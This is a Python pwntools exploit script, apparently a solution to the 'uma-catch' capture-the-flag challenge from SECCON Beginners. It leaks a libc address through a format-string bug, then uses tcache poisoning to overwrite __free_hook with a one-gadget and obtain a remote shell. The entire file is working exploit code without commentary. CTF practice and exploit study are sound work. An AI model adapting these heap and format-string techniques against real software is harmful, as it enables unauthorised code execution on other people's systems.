#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = './chall'
libc = ELF('./libc.so.6')
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == 'r':
    p = remote('uma-catch.quals.beginners.seccon.jp', 4101)
elif len(argv) >= 2 and argv[1] == 'd':
	cmd = """
        b *naming+88
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def catch(index: int):
	p.sendlineafter('>', '1')
	p.sendlineafter('>', str(index))
	p.sendlineafter('>', 'bay')

def naming(index: int, name: bytes):
	p.sendlineafter('>', '2')
	p.sendlineafter('>', str(index))
	p.sendlineafter('>', name)

def show(index: int):
	p.sendlineafter('>', '3')
	p.sendlineafter(">", str(index))

def dance(index: int):
	p.sendlineafter('>', '4')
	p.sendlineafter('>', str(index))

def release(index: int):
	p.sendlineafter('>', '5')
	p.sendlineafter('>', str(index))



# libc leak
off_start_main = libc.symbols["__libc_start_main"] + 231
catch(0)
naming(0, '%11$p')
show(0)
leak = eval(p.recvline(14))
log.info("leak: 0x{:08x}".format(leak))
libc_base = leak - off_start_main
log.info("libc_base: 0x{:08x}".format(libc_base))
release(0)

# execute One-Gadget RCE with tcache poisoning
off_one_gadget = 0x4f432
free_hook = libc_base + libc.sym['__free_hook']
log.info("free_hook: 0x{:08x}".format(free_hook))
naming(0, p64(libc_base + libc.sym['__free_hook']))
catch(1)
catch(2)
naming(2, p64(libc_base + off_one_gadget))
release(1)

p.interactive()
